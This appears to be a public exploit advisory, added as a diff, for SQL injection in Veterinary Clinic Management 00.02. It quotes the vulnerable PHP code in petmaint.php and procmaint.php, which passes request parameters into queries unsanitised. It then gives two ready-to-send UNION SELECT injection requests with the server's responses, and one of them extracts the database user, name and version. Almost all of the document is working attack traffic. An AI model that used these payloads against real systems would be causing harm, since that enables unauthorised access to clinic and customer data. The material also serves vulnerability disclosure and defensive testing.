@@ -1,0 +1,86 @@
+# Exploit Title: Veterinary Clinic Management 00.02 - 'editpetnum' SQL Injection
+# Dork: N/A
+# Date: 2018-10-25
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://vetclinic.sourceforge.io/
+# Software Link: https://sourceforge.net/projects/vetclinic/files/latest/download
+# Version: 00.02
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/petmaint.php?editpetnum=[SQL]
+# 
+# [PATH]/petmaint.php
+# ....
+#154 $editpetnum = "";
+#155 
+#156 if(isset($_POST["editpetnum"])) {
+#157      $editpetnum = $_POST["editpetnum"];
+#158      unset($_POST["editpetnum"]);
+#159 }
+#160 else if(isset($_GET["editpetnum"])) {
+#161      $editpetnum = $_GET["editpetnum"];
+#162      unset($_GET["editpetnum"]);
+#163 }
+# ....
+ 
+GET /[PATH]/petmaint.php?editpetnum=-0x496873616e2053656e63616e+UniOn++SeLect++0x496873616e2053656e63616e%2c0x496873616e2053656e63616e%2c0x496873616e2053656e63616e%2c0x496873616e2053656e63616e%2c0x496873616e2053656e63616e%2c0x496873616e2053656e63616e%2c0x496873616e2053656e63616e%2c0x496873616e2053656e63616e%2c0x496873616e2053656e63616e%2c0x496873616e2053656e63616e%2cCONCAT(CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()))%2c0x496873616e2053656e63616e%2c0x496873616e2053656e63616e%2c0x496873616e2053656e63616e%2c0x496873616e2053656e63616e--+Efe HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Thu, 25 Oct 2018 22:18:01 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Set-Cookie: PHPSESSID=8dts9gt545rgn1f5i4pgn573a3; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/procmaint.php?proccode=[SQL]
+# 
+# [PATH]/procmaint.php
+# ....
+#28 require_once "includes/common.inc";
+#29 $emplnumber = $_SESSION['employeenumber'];
+#30 $display = "ProcMaint:".$emplnumber;
+#31 if(isset($_GET["proccode"])) {
+#32      $proccode = $_GET["proccode"];
+#33 } else {
+#34      $proccode = "";
+#35 }
+#36 if ($proccode == "")
+#37 {
+# ....
+ 
+GET /[PATH]/procmaint.php?proccode=%27%27%27%27+unioN+selECt++nuLL,nuLL,nuLL,conCAT(0x496873616e2053656e63616e),nuLL--+Efe HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=8dts9gt545rgn1f5i4pgn573a3
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Thu, 25 Oct 2018 22:22:33 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 2697
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
